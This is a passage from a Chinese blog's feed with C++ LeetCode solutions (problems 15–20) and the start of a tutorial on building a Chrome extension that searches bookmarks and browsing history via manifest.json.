class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">sort(nums.begin(), nums.end());</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; i ++) &#123;</span><br><span class="line">            <span class="keyword">int</span> l = i + <span class="number">1</span>, r = len - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="keyword">int</span> value = nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (value &lt; (-nums[i]))l ++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value &gt; (-nums[i]))r --;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.insert(&#123;nums[i], nums[l], nums[r]&#125;);</span><br><span class="line">                <span class="keyword">while</span> (l&lt;r &amp;&amp; nums[l] == nums[l+<span class="number">1</span>])l ++;</span><br><span class="line">                    <span class="keyword">while</span> (l&lt;r &amp;&amp; nums[r] == nums[r<span class="number">-1</span>]) r --;</span><br><span class="line">                    l ++;</span><br><span class="line">                    r --;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;(res.begin(), res.end());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="16 最接近的三数之和"><a class="header-anchor" href="#16 最接近的三数之和" aria-hidden="true">¶</a> 16 最接近的三数之和</h2><ul><li>题目</li></ul><blockquote><p>给定一个包括 <em>n</em> 个整数的数组 <code>nums</code> 和 一个目标值 <code>target</code>。找出 <code>nums</code> 中的三个整数，使得它们的和与 <code>target</code> 最接近。返回这三个数的和。假定每组输入只存在唯一答案。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 例如，给定数组 nums = [-1，2，1，-4], 和 target = 1.</span><br><span class="line">&gt; </span><br><span class="line">&gt; 与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2).</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>最接近三数和，可能是大于target也可能是小于target，当然相等是最接近的</p><p>接上一题，二分法</p><p>先确定第一个数，更新target</p><p>如果两数和小于新target，左边下标+1；</p><p>如果两数和大于新target，右边下标-1；</p><p>不断更新最接近三数和的值，和最小距离</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">threeSumClosest</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = nums.size();</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">3</span>)    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">sort(nums.begin(), nums.end());</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dis = INT_MAX;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; i ++) &#123;</span><br><span class="line"><span class="keyword">int</span> new_target = target - nums[i];</span><br><span class="line">            <span class="keyword">int</span> l = i + <span class="number">1</span>, r = len - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="keyword">int</span> value = nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (value &lt; new_target)l ++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value &gt; new_target)r --;</span><br><span class="line">                <span class="keyword">else</span><span class="keyword">return</span> target;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">abs</span>(new_target - value) &lt; dis) &#123;</span><br><span class="line">                dis = <span class="built_in">abs</span>(new_target - value);</span><br><span class="line">                sum = nums[i] + value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="17 电话号码的字母组合"><a class="header-anchor" href="#17 电话号码的字母组合" aria-hidden="true">¶</a> 17 电话号码的字母组合</h2><ul><li>题目</li></ul><blockquote><p>给定一个仅包含数字 <code>2-9</code> 的字符串，返回所有它能表示的字母组合。</p><p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-30/25247088.jpg" alt="img"></p><p><strong>示例:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入：&quot;23&quot;</span><br><span class="line">&gt; 输出：[&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;].</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>每个数字包含3-4个字母，字母组合为$$(3 or 4)^n$$，数字字符串有多长就要多少个迭代器，所以只能通过递归来实现</p><p>ps，下次遍历数字代表的字母，要把前一次字母踢掉</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; letterCombinations(<span class="built_in">string</span> digits) &#123;</span><br><span class="line">    <span class="keyword">if</span> (digits.empty()) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; res;</span><br><span class="line">    <span class="built_in">string</span> item = <span class="string">""</span>;</span><br><span class="line">letterMix(res, digits, <span class="number">0</span>, item);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">string</span> str[<span class="number">10</span>] = &#123;<span class="string">""</span>,<span class="string">""</span>,<span class="string">"abc"</span>,<span class="string">"def"</span>,<span class="string">"ghi"</span>,<span class="string">"jkl"</span>,<span class="string">"mno"</span>,<span class="string">"pqrs"</span>,<span class="string">"tuv"</span>,<span class="string">"wxyz"</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">letterMix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; res, <span class="built_in">string</span> digits, <span class="keyword">int</span> index, <span class="built_in">string</span>&amp; item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index == digits.size()) &#123;</span><br><span class="line">    res.push_back(item);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num = digits[index] - <span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;str[num].size(); i++) &#123;</span><br><span class="line">item += str[num][i];</span><br><span class="line">letterMix(res, digits, index+<span class="number">1</span>, item);</span><br><span class="line">item.pop_back();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="18 四数之和"><a class="header-anchor" href="#18 四数之和" aria-hidden="true">¶</a> 18 四数之和</h2><ul><li>题目</li></ul><blockquote><p>给定一个包含 <em>n</em> 个整数的数组 <code>nums</code> 和一个目标值 <code>target</code>，判断 <code>nums</code> 中是否存在四个元素 <em>a，b，c</em> 和 <em>d</em> ，使得 <em>a</em> + <em>b</em> + <em>c</em> + <em>d</em> 的值与 <code>target</code> 相等？找出所有满足条件且不重复的四元组。</p><p><strong>注意：</strong></p><p>答案中不可以包含重复的四元组。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; 给定数组 nums = [1, 0, -1, 0, -2, 2]，和 target = 0。</span><br><span class="line">&gt; </span><br><span class="line">&gt; 满足要求的四元组集合为：</span><br><span class="line">&gt; [</span><br><span class="line">&gt;   [-1,  0, 0, 1],</span><br><span class="line">&gt;   [-2, -1, 1, 2],</span><br><span class="line">&gt;   [-2,  0, 0, 2]</span><br><span class="line">&gt; ]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>三数之和的进一步提升</p><p>用之前二分法，多一个迭代器，时间复杂度：O(n^2 logn​)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; fourSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line"><span class="keyword">int</span> len = nums.size();</span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">4</span>)    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">sort(nums.begin(), nums.end());</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">3</span>; i ++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; len <span class="number">-2</span>; j++) &#123;</span><br><span class="line"><span class="keyword">int</span> new_target = target - (nums[i] + nums[j]);</span><br><span class="line">    <span class="keyword">int</span> l = j + <span class="number">1</span>, r = len - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="keyword">int</span> value = nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (value &lt; new_target)l ++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value &gt; new_target)r --;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.insert(&#123;nums[i], nums[j], nums[l], nums[r]&#125;);</span><br><span class="line">                <span class="keyword">while</span> (l&lt;r &amp;&amp; nums[l] == nums[l+<span class="number">1</span>])l ++;</span><br><span class="line">                    <span class="keyword">while</span> (l&lt;r &amp;&amp; nums[r] == nums[r<span class="number">-1</span>]) r --;</span><br><span class="line">                    l ++;</span><br><span class="line">                    r --;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;(res.begin(), res.end());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="19 删除链表的倒数第N个节点"><a class="header-anchor" href="#19 删除链表的倒数第N个节点" aria-hidden="true">¶</a> 19 删除链表的倒数第N个节点</h2><ul><li>题目</li></ul><blockquote><p>给定一个链表，删除链表的倒数第 <em>n</em> 个节点，并且返回链表的头结点。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.</span><br><span class="line">&gt; </span><br><span class="line">&gt; 当删除了倒数第二个节点后，链表变为 1-&gt;2-&gt;3-&gt;5.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>第一步，将链表的值放到一个数组里</p><p>第二步，将数组的值加到链表，出去<code>v[v.size()-n]</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">ListNode* <span class="built_in">list</span> = <span class="keyword">new</span> ListNode(<span class="number">0</span>), *tmp = head, *curr = <span class="built_in">list</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">        <span class="keyword">while</span> (tmp) &#123;</span><br><span class="line"> v.push_back(tmp-&gt;val);</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;v.size(); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (i == v.size()-n) <span class="keyword">continue</span>;</span><br><span class="line">curr-&gt;next = <span class="keyword">new</span> ListNode(v[i]);</span><br><span class="line">curr = curr-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="20 有效的括号"><a class="header-anchor" href="#20 有效的括号" aria-hidden="true">¶</a> 20 有效的括号</h2><ul><li>题目</li></ul><blockquote><p>给定一个只包括 <code>'('</code>，<code>')'</code>，<code>'{'</code>，<code>'}'</code>，<code>'['</code>，<code>']'</code> 的字符串，判断字符串是否有效。</p><p>有效字符串需满足：</p><ol><li>左括号必须用相同类型的右括号闭合。</li><li>左括号必须以正确的顺序闭合。</li></ol><p>注意空字符串可被认为是有效字符串。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;()&quot;</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;()[]&#123;&#125;&quot;</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;(]&quot;</span><br><span class="line">&gt; 输出: false</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;([)]&quot;</span><br><span class="line">&gt; 输出: false</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;&#123;[]&#125;&quot;</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>STL : <code>&lt;stack&gt;</code></p><p>发现一个左符号，就在栈中添加一个右符号</p><p>stack先进后出</p><p>找到一个右符号，出栈，比较</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.empty())  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; myStack;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;s.size(); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] == <span class="string">'('</span>)    myStack.push(<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'['</span>)   myStack.push(<span class="string">']'</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">'&#123;'</span>)   myStack.push(<span class="string">'&#125;'</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (myStack.empty())    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (myStack.top() != s[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">myStack.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> myStack.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="LeetCode" scheme="http://www.danboard.me/categories/LeetCode/"/>
    
    
      <category term="C/C++" scheme="http://www.danboard.me/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>chrome扩展程序-书签及历史记录的搜索</title>
    <link href="http://www.danboard.me/chrome%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F-%E4%B9%A6%E7%AD%BE%E5%8F%8A%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%9A%84%E6%90%9C%E7%B4%A2/"/>
    <id>http://www.danboard.me/chrome扩展程序-书签及历史记录的搜索/</id>
    <published>2018-09-29T08:00:22.000Z</published>
    <updated>2018-09-29T14:11:09.372Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://images.gitee.com/uploads/images/2018/0929/165102_b3d93340_1543733.png" alt="https://images.gitee.com/uploads/images/2018/0929/165102_b3d93340_1543733.png"></p><a id="more"></a><h2 id="背景"><a class="header-anchor" href="#背景" aria-hidden="true">¶</a> 背景</h2><p>第一种情况：</p><p>一般浏览习惯，会收藏一些页面，久而久之，收藏夹中存储过多，即使对页面进行分组也不好查找；</p><p><code>chrome://bookmarks</code>可以打开标签管理，但是跳转页面对用户始终是不友好的</p><p>第二种情况：</p><p>浏览器意外关闭，忘记保存页面，下次要找的时候就不太容易；</p><p>同样<code>chrome://history</code></p><p>chrome浏览器支持自定义扩展，给开发者带来了更好的体验</p><h2 id="chrome扩展程序"><a class="header-anchor" href="#chrome扩展程序" aria-hidden="true">¶</a> chrome扩展程序</h2><p><a href="http://open.chrome.360.cn/extension_dev/overview.html" target="_blank" rel="noopener">详细教程</a></p><p>一个扩展程序应包含文件：</p><ul><li>一个manifest.json</li><li>html文件</li><li>js文件</li><li>icon图标</li></ul><h3 id="manifest.json"><a class="header-anchor" href="#manifest.json" aria-hidden="true">¶</a> manifest.json</h3><blockquote><p>包含一个扩展程序的注册信息</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  // 必须的字段</span><br><span class="line">  "name": "My Extension",</span><br><span class="line">  "version": "versionString",</span><br><span class="line">  "manifest_version": 2,</span><br><span class="line">  // 建议提供的字段</span><br><span class="line">  "description": "A plain text description",</span><br><span class="line">  "icons": &#123; ... &#125;,</span><br><span class="line">  "default_locale": "en",</span><br><span class="line">  // 多选一，或者都不提供</span><br><span class="line">  "browser_action": &#123;...&#125;,</span><br><span class="line">  "page_action": &#123;...&#125;,</span><br><span class="line">  "theme": &#123;...&#125;,</span><br><span class="line">  "app": &#123;...&#125;,</span><br><span class="line">  // 根据需要提供</span><br><span class="line">  "background": &#123;...&#125;,</span><br><span class="line">  "chrome_url_overrides": &#123;...&#125;,</span><br><span class="line">  "content_scripts": [...],</span><br><span class="line">  "content_security_policy": "policyString",</span><br><span class="line">  "file_browser_handlers": [...],</span><br><span class="line">  "homepage_url": "http://path/to/homepage",</span><br><span class="line">  "incognito": "spanning" or "split",</span><br><span class="line">  "intents": &#123;...&#125;</span><br><span class="line">  "key": "publicKey",</span><br><span class="line">  "minimum_chrome_version": "versionString",</span><br><span class="line">  "nacl_modules": [...],</span><br><span class="line">  "offline_enabled": true,</span><br><span class="line">  "omnibox": &#123; "keyword": "aString" &#125;,</span><br><span class="line">  "options_page": "aFile.html",</span><br><span class="line">  "permissions": [...],</span><br><span class="line">  "plugins": [...],</span><br><span class="line">  "requirements": &#123;...&#125;,</span><br><span class="line">  "update_url": "http://path/to/updateInfo.xml",</span><br><span class="line">  "web_accessible_resources": [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>browser actions</strong> 可以在chrome主工具条的地址栏右侧增加一个图标。作为这个图标的延展，一个browser action图标还可以有<a href="http://open.chrome.360.cn/extension_dev/browserAction.html#tooltip" target="_blank" rel="noopener">tooltip</a>、<a href="http://open.chrome.360.cn/extension_dev/browserAction.html#badge" target="_blank" rel="noopener">badge</a>和<a href="http://open.chrome.360.cn/extension_dev/browserAction.html#popups" target="_blank" rel="noopener">popup</a>。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"My extension"</span>,</span><br><span class="line">  ...</span><br><span class="line">  "browser_action": &#123;</span><br><span class="line">    "default_icon": "images/icon19.png", // optional </span><br><span class="line">    "default_title": "Google Mail",      // optional; shown in tooltip </span><br><span class="line">    "default_popup": "popup.html"        // optional </span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>permissions</strong> 扩展程序将使用的一组权限。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">"permissions": </span><br><span class="line">[    </span><br><span class="line"><span class="string">"tabs"</span>,    </span><br><span class="line"><span class="string">"bookmarks"</span>,    </span><br><span class="line"><span class="string">"http://www.blogger.com/"</span>,    </span><br><span class="line"><span class="string">"http://*.google.com/"</span>,    </span><br><span class="line"><span class="string">"unlimitedStorage"</span>  </span><br><span class="line">],</span><br></pre></td></tr></table></figure><blockquote><p><strong>manifest_version</strong> 用整数表示manifest文件自身格式的版本号。</p><p><strong>content_security_policy</strong> 为缓解潜在的大规模的跨站点脚本攻击问题，Chrome扩展系统已遵循<a href="http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html" target="_blank" rel="noopener"> <strong>Content Security Policy (CSP)</strong></a>的理念，引入了严格的策略使扩展更安全，同时提供创建和实施策略规则的能力，这些规则用以控制扩展（或应用）能够加载的资源和执行的脚本。</p><p>定义<code>manifest_version</code>为2的扩展才会默认开启内容安全策略。</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"content_security_policy": script-src 'self'; object-src 'self'</span><br></pre></td></tr></table></figure><p>放宽默认策略（白名单）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 允许加载 https://example.com 上的脚本</span><br><span class="line">"content_security_policy": "script-src 'self' https://example.com; object-src 'self'"</span><br></pre></td></tr></table></figure><h3 id="searchAll"><a class="header-anchor" href="#searchAll" aria-hidden="true">¶</a> searchAll</h3><blockquote><p>查询 浏览器收藏夹 和 历史浏览记录</p></blockquote><p>效果如下：</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/88468247.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/88468247.jpg"></p><p>文件目录：</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/56623319.jpg" 